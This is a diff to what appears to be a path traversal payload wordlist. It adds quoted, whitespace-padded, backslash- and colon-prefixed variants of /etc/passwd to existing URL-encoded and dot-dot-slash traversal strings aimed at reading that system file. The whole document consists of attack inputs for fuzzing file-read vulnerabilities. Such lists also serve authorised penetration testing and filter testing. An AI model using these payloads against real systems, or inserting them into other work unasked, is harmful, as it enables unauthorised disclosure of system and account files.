@@ -5,6 +5,8 @@ passwd
 PASSWD
 /etc/passwd
 /ETC/PASSWD
+"/etc/passwd"
+"/ETC/PASSWD"
 \/etc\/\passwd
 \/ETC\/\PASSWD
 ../../../../etc/passwd
@@ -25,6 +27,16 @@ PASSWD
 %2e%2e\%2e%2e\%2e%2e\%2e%2e\ETC/PASSWD(..\..\..\ETC\PASSWD)
 %2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2e%2e%2e%2e%2fpasswd(..../…./etc/passwd)
 %2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2e%2e%2e%2e%2fPASSWD(..../…./etc/passwd)
+      \/etc/\/passwd
+      \/ETC/\/PASSWD
+:    /etc/passwd
+:    /ETC/PASSWD
+\\\\    \/etc/\/passwd
+\\\\    \/ETC/\/PASSWD
+\\\\   : \/etc/passwd
+\\\\   : \/ETC/passwd
+\\\\   : /etc/passwd
+\\\\   : /ETC/PASSWD
 \…..\\\…..\\\…..\\\etc\\passwd
 \…..\\\…..\\\…..\\\ETC\\PASSWD
 /…..///…..///…..///etc//passwd
